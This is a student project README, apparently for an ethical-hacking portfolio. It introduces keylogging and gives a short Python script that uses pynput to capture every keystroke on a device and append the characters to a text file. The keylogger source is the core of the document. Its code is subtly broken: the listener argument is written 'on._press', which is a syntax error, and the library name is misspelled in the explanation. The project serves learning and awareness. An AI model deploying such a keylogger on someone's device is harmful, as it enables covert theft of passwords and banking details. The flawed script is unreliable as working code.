## Background and Significance 🔍
Keylogging is the method of storing key-strokes on a device, particularly without the user knowing. Having a program such as this running on your device will result in the unaware surrendering of confidential data to malicious hackers, including login credentials and banking details.

## Objective 🥅
This mini-project aims to create a successful key-logging script, that when executed, will capture keystrokes made by the user in any environment on the device and store them in a text file automatically for viewing. This project therefore demonstrates the basics of keylogging, highlighting the dangers of this simple technique.

## Skills Learned and Improved ✅
- Learning this attacking technique strengthened my ethical hacking fundamentals.
- Increased cybersecurity awareness surrounding even simple malicious methods.
- Honing my Python skills.

## Tools/Languages Used 🔨
- VSCode
- Python

## Script 📜
<code>
from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error: Character could not be obtained.")

if __name__ == "__main__":
    listener = keyboard.Listener(on._press=keyPressed) 
    listener.start()
    input()
</code>

## How it Works ❓
1. Keystrokes are listened for using pynut library
2. When this script is executed, these keystrokes are then appended to a file (keyfile.txt) and also appear in the terminal
